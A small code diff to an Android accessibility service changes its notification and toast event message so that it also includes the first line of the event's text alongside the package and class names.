@@ -115,7 +115,8 @@ public class Ll_AccessibilityService extends AccessibilityService
                     {
                         sendMessage(
                                 "notification|toast|" + event.getPackageName()
-                                        + "|" + event.getClassName());
+                                        + "|" + event.getClassName() + "|"
+                                        + event.getText().get(0));
                     }
                 }
                 catch (Exception e)
